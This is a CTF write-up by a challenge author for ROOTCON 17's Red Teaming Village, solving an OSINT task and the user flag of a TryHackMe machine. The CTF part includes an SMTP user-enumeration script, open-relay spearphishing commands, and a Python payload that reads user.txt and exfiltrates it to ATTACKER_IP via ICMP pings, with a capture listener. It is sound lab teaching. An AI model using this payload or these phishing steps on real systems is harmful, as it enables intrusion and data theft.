---
layout: post
title: (ROOTCON 17) Red Teaming Village's OSINT and CTF Challenge Writeup/Solution 
subtitle: Here are the solutions to the OSINT and CTF challenges I created for Red Teaming Village at ROOTCON 17.
excerpt: Here are the solutions to the OSINT and CTF challenges I created for Red Teaming Village at ROOTCON 17.
comments: false
thumbnail-img: https://i.imgur.com/CsiXD3O.png
categories:
- CTF 
---

Below are the solutions to the **Open Source Intelligence (OSINT)** and **Capture the Flag (CTF) challenges** I created for [**Red Teaming Village**](https://www.facebook.com/redteamingph) at [**ROOTCON 17**](https://www.facebook.com/rootcon).

{: .box-note}
**Note:** As there were no solvers for the CTF challenge, I will only be sharing a partial solution (acquiring user.txt file). Since, I might also plan to use the same concept in future challenges.

![(ROOTCON 17) Red Teaming Village's OSINT and CTF Challenge Writeup/Solution ](https://i.imgur.com/CsiXD3O.png){: .mx-auto.d-block :}

## RTV OSINT Challenge

### Description:
This was done batch by batch, where the RTV Operators hid a passphrase (flag) across their social media profiles. Players needed to find all the passphrases for each batch and then approach the right operator to get their acknowledgement. The RTV Operator would then provide their acknowledgement code.

### Solution Summary:
I have placed my passphrase (flag) in my YouTube channel [**Ethical Hackers Club**](https://youtube.com/EthicalHackersClub). It can be found in the transcript/subtitle section of all recently published videos. 
~~~
Answer is: 4lw4y$_st4y_humbL3_&_k!nD
~~~

#### Manual Solution:
To find the passphrase, visit any of the recently published videos and **enable subtitles/captions**. Alternatively, access the video transcript by clicking the three dots below the video, and then selecting **'Show Transcript'**.

![](https://i.imgur.com/3hZiLE4.png){: .mx-auto.d-block :}


#### Script/Automated Solution:
This task can also be automated using available YouTube scripts for example: [youtube-transcript-api by jdepoix](https://github.com/jdepoix/youtube-transcript-api).

![](https://i.imgur.com/Gv6lTCF.png){: .mx-auto.d-block :}

Here is a sample code implementing the youtube-transcript-api to get the passphrase (flag).

```
#!/usr/bin/python3
# Simple caption/subtitle reader for YouTube
# by Ameer Pornillos
# https://ethicalhackers.club
# To use: 
# > pip3 install youtube_transcript_api
# > change the video_id to target video IDs
# > python3 grab_youtube_subtitles.py

#YouTube Videos (recently published from https://youtube.com/EthicalHackersClub)
#https://www.youtube.com/watch?v=nGedsTmoyEI
#https://www.youtube.com/watch?v=nErc6nMwmOU
#https://www.youtube.com/watch?v=WCuDC6MLB_s
#https://www.youtube.com/watch?v=TRe0eGIsB5k

from youtube_transcript_api import YouTubeTranscriptApi

video_id = ['nGedsTmoyEI', 'nErc6nMwmOU', 'WCuDC6MLB_s', 'TRe0eGIsB5k']

def check_transcript(videos):
    for video in videos:
        print("From https://www.youtube.com/watch?v=" + video +"\n")
        print(YouTubeTranscriptApi.get_transcript(video))

check_transcript(video_id)
```

#### Fun Fact:
Originally, a *QR Code* was supposed to be hidden in [one of the videos](https://www.youtube.com/watch?v=TRe0eGIsB5k), visible in the lower right corner of the desktop wallpaper. However, this was deemed too difficult to spot, so the challenge/solution was changed to an easier method.


## RTV CTF Challenge

![](https://i.imgur.com/FAvyeqN.png){: .mx-auto.d-block :}

### Description:
Here is one of the **CTF Challenge for** [**Red Teaming Village**](https://www.facebook.com/redteamingph) at **ROOTCON 17**. This is a **boot to root machine challenge** where the players need to find vulnerabilities in the machine and exploit it. The aim is to infiltrate the machine and capture all flags (be able to acquire user.txt and root.txt).

A major hint was also shared which is a [Mitre ATT&CK matrix](https://bit.ly/RC17-RTV-CTF-Challenge) covering all tactics, techniques, and procedures to compromise the target machine.

![](https://i.imgur.com/zYMyMnI.png){: .mx-auto.d-block :}

Another hint was also provided during the 2nd day of ROOTCON 17 which is: **Spearphishing + ICMP (Linux)**.

The challenge is available as a room in **TryHackMe:** [**Cosmo**](https://tryhackme.com/jr/cosmo). (Player/s would [**need to be registered at TryHackMe**](https://tryhackme.com/signup?referrer=6160f102a5d5960041a2d321) and use his/her TryHackMe OpenVPN file to be able to interact with the machine.)

### Solution Summary:

{: .box-note}
**Note:** As mentioned earlier, only a partial solution covering the acquisition of the **user.txt** file will be shared.

#### Steps:
1. Gather victim information (email addresses)
2. Exploit open mail relay (find valid user/victim and use this for sending email/s)
3. Send spearphishing link to the victim containing payload
4. Await the victim to execute the payload
5. Abuse ICMP (for files/directories discovery and data exfiltration)
6. ~~Escalate privileges~~

#### Challenges:
The main hurdles a player may face while solving the challenge include:
- Finding valid user for spearphishing.
- Crafting a payload to work with ICMP (the payload needs to run as a low privilege user, performing tasks such as executing commands and data exfiltration).
- Bypassing antivirus (ClamAV is installed on the machine and scans the payload, causing some payloads to take longer to execute or even get quarantined as they are scanned first).
- ~~Discovering and exploiting the privilege escalation vector.~~

#### For this solution we will cover:
- Port scanning/checking for available services
- Gathering victim information (email addresses)
- Exploiting open mail relay (finding valid user/victim and sending the email using it)
- Sending spearphishing link to the victim containing crafted payload *(crafted payload for this solution will be limited to only acquire user.txt file)*


##### Port Scanning/Checking for Open Services
Just do a basic port scan to list available services for the machine. Below is an example command for it.
```
sudo nmap {TARGET_MACHINE} -p1-10000 --min-rate 10000 --max-retries 3 -T4
```
![](https://i.imgur.com/I14gOiE.png){: .mx-auto.d-block :}

##### Gathering Victim Information (Email Addresses)
Email addresses are available via the web application's Find Instructor page (the web application is available via port 8080): 
~~~
http://{MACHINE_IP}:8080/instructors?page=1
~~~


![](https://i.imgur.com/mfKf1V7.png){: .mx-auto.d-block :}

Use [cewl](https://www.kali.org/tools/cewl/) to extract email addresses from the web app:
```
cewl 'http://{MACHINE_IP}:8080/instructors?page=1' -n -e --email_file emails.txt
```
![](https://i.imgur.com/APbJY0g.png){: .mx-auto.d-block :}


{: .box-note}
**Note:** By default, cewl would not be able to find the email addresses in the web app. This is because the default cewl can only find email addresses with 2 to 4 letters as TLDs which a typical TLD consists of. 

To fix this, just edit the cewl tool (usually in /usr/bin/cewl) and change the regex on how it finds email addresses as seen below (in a new Kali Linux installation, it is in line 995 of the file): 

![](https://i.imgur.com/Llgp8uR.png){: .mx-auto.d-block :}

~~~
from
"while /\b([A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4})\b/i.match(word)" 
to 
"while /\b([A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,11})\b/i.match(word)"
~~~

This will grab at least 11 characters TLDs.

Or alternatively, you could use other tools (e.g. Burp Suite, curl, wget, etc.) to output the webpages and just parse the email addresses.


##### Exploit Open Mail Relay (Find valid user/victim)
If you did run a port scan, you should find a mail service running in port 25.

Below are commands available from the server.

![](https://i.imgur.com/uMnphdH.png){: .mx-auto.d-block :}

Trying for open mail relay, you would notice that the mail server rejects sender address that is not using the **"@rtv.local"** domain (domain is used by email addresses in the website).

![](https://i.imgur.com/i3iHHrm.png){: .mx-auto.d-block :}

Additionally, it rejects recipients that are not valid users.

![](https://i.imgur.com/uIkYfJP.png){: .mx-auto.d-block :}

In short, you need to be able to find a valid user which you could target for spearphishing.
In order to find a valid user, you could use any of these commands: VRFY, MAIL FROM and RCPT TO.

For this solution, we would use the **VRFY** command.

Here is a script that would run through the list of email addresses and check whether the user is valid or not using VRFY command.

```
#!/usr/bin/python3
# Simple proof of concept to test VRFY command against emails in list
# by Ameer Pornillos
# https://ethicalhackers.club
# To use: 
# > python3 script_name.py emails.txt --host target.host

import argparse
import subprocess

# Function to verify email address using VRFY command
def verify_email_address(email_address, host="localhost", port=25):
    try:
        # Use netcat (nc) to connect to the mail server and send VRFY command
        nc_command = f"nc -w 1 {host} {port}"
        vrfy_command = f"VRFY {email_address}"
        result = subprocess.check_output(f"echo '{vrfy_command}' | {nc_command}", shell=True, stderr=subprocess.STDOUT)
        return result.decode("utf-8").strip()
    except subprocess.CalledProcessError as e:
        # Handle errors (e.g., if the email address is not valid)
        return e.output.decode("utf-8").strip()

# Parse command line arguments
parser = argparse.ArgumentParser(description="Verify email addresses using the VRFY command.")
parser.add_argument("emails_file", help="Path to the file containing email addresses")
parser.add_argument("--host", default="localhost", help="Mail server hostname or IP address (default: localhost)")
args = parser.parse_args()

# Read email addresses from the specified file and verify them
with open(args.emails_file, "r") as file:
    for line in file:
        email_address = line.strip()
        verification_result = verify_email_address(email_address, host=args.host)
        if "unknown" in verification_result.lower():
            print(f"Not valid user: {email_address}")
        else:
            print(f"Valid user found: {email_address}")
            break  # Stop the script if a valid user is found

```

TL;DR: The correct user is: **laughingman@rtv.local**

![](https://i.imgur.com/s1f3uju.png){: .mx-auto.d-block :}

By the way, if you tried to check the user information in the web app, you should see **"Data Exfiltration Techniques"**, which is a minor hint related to the challenge. (◕‿◕)

![](https://i.imgur.com/ehTP5Xf.png){: .mx-auto.d-block :}

#### Fun Fact: 
The original web application for the challenge was designed to have over hundreds of email addresses. The idea is to compare the "Find Instructors" results to the "Official Instructors" and grabbing only the emails of the "Official Instructors" (so it was not needed to check all of the emails if they are valid). The email addresses were lessened to around 40+ to make the challenge more simple and easier to solve.

##### Send Spearphishing link to the victim containing crafted payload

{: .box-warning}
**Note:** Payload given here would be limited to acquiring the contents of the user.txt file via ICMP data exfiltration.

Previously, it was found that **laughingman@rtv.local** is a valid target and a user that exist in the machine.

The next step is to send a spearphishing email to the account using the open mail relay with a link to the payload.

**Hosting the payload:**
~~~
python3 -m http.server 1337
~~~

**Sending the email via open mail relay vulnerability:**

~~~
nc {MACHINE_IP} 25
~~~

(for MAIL FROM: you can use any default users in machine, or even use laughingman@rtv.local user itself)

~~~
MAIL FROM: root@rtv.local 
RCPT TO: laughingman@rtv.local 
DATA:

Check this out! http://{ATTACKER_IP:PORT}/payload

.
~~~

{: .box-warning}
**Note:** You could use any script or application provided that it will allow you to exfiltrate data using ICMP from the compromised machine.

Here is an example payload that will exfiltrate the output of home directory listing as well as contents of the user.txt file via ICMP.

```
#!/usr/bin/python3
# Just a simple proof of concept for ICMP exfiltration
# by Ameer Pornillos
# https://ethicalhackers.club
# To use: 
# > change domain value to your attacking machine IP address/domain
# > change command value to your desired command 
# > run inside a target machine
# > python3 payload.py

import sys
import subprocess
import re
import binascii

def main():
    domain = "ATTACKER_IP"
    command = 'ls -al ~; ls -al /home/*/user.txt; cat /home/*/user.txt'

    try:
        input_data = subprocess.check_output(command, shell=True, text=True)
        hex_data = binascii.hexlify(input_data.encode()).decode()
    except subprocess.CalledProcessError:
        print(f"Error: Failed to run the command '{command}'")
        sys.exit(1)

    for a in re.findall(r'.{1,32}', hex_data, flags=re.DOTALL):
        dsize = len(a)

        if dsize < 32:
            padding = "0" * (32 - dsize)
            a += padding

        subprocess.run(["ping", "-c", "1", "-p", a, domain, "-s", "32"])

if __name__ == "__main__":
    main()
```

{: .box-warning}
**Note:** Below is an example script to capture ICMP packets. The idea is to capture the packets and be able to examine it. You could also use packet analyzer tools such as WireShark, though keep in mind that you might need to parse the data output into a more readable format.

Here is an example script for the attacking machine to capture ICMP packets and unpack it.

```
#!/usr/bin/python3
# Simple proof of concept for ICMP exfiltration
# by Ameer Pornillos
# https://ethicalhackers.club
# To use: sudo python3 icmp_capture.py

import socket
import struct
import os
import sys

def receive_messages_via_icmp():
    try:
        # Check if the script is run as root
        if os.geteuid() != 0:
            print("Error: This script must be run as root.")
            sys.exit(1)

        icmp_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)

        while True:
            packet, _ = icmp_socket.recvfrom(1024)
            # Unpack the ICMP header (Type, Code, Checksum, Identifier, Sequence Number)
            icmp_type, _, _, _, _ = struct.unpack('!BBHHH', packet[20:28])
            if icmp_type == 8:  # ICMP Echo
                message = packet[-16:]  # Read only the last 16 bytes
                message_str = message.decode('utf-8', 'ignore')  # Decode as UTF-8
                print(message_str, end='')  # Use end='' to prevent adding a newline

    except Exception as e:
        print(f"Error: {str(e)}")

if __name__ == "__main__":
    receive_messages_via_icmp()
```
Wait for the victim to click the link and download the payload. Screenshot below shows receiving a web request from the victim's machine.

![](https://i.imgur.com/VqUw8tx.png){: .mx-auto.d-block :}

After the victim runs the payload, you should be able to acquire the **user.txt** file. You could use the same tactic to enumerate the machine and try to escalate your privilege and acquire root.txt file.

![](https://i.imgur.com/sEcSpaS.png){: .mx-auto.d-block :}


{: .box-success}
Thats it for the partial solution. If you are looking for an extra challenge, then try getting C2 (Command and Control / C&C) callbacks as that would make the challenge easier. Though, keep in mind that the initial access user is only a low privilege user.


Thanks for reading! · (*ˊᗜˋ*)/ᵗᑋᵃᐢᵏ ᵞᵒᵘ*

{: .box-error}
**P.S.:** I would like to thank GuideM, especially Ian, Renzon, and their entire team, for sponsoring the Red Teaming Village at ROOTCON 17. Thank you! 🙏 I would also like to express my gratitude to the entire [**Red Teaming Village**](https://www.facebook.com/redteamingph) Team at ROOTCON 17, as well as all the hackstreetboys and their families that are present/attended the conference (Mon + Arcy, AJ, Emman, Ariz, Felix, Ian, CJ, Ronald, Shav, Rodel, Bianca and Sir Mon). Shoutout to all my idols, friends and acquaintances I saw at the conference. It was nice seeing you all. 🫡

Cheers! 🍻

### Video Walkthrough
By the way, here is the [**full video walkthrough**](http://www.youtube.com/watch?feature=player_embedded&v=ChXqsuu73q0) using the solutions above to solve the **user.txt** flag for the [**Red Teaming Village**](https://www.facebook.com/redteamingph) **CTF Challenge at ROOTCON 17**.

<center>
<a href="http://www.youtube.com/watch?feature=player_embedded&v=ChXqsuu73q0" target="_blank"><img align="center" src="http://img.youtube.com/vi/ChXqsuu73q0/0.jpg" alt="(ROOTCON 17) Red Teaming Village's OSINT and CTF Challenge Walkthrough/Solution" width="500" height="375" border="10" /></a></center>




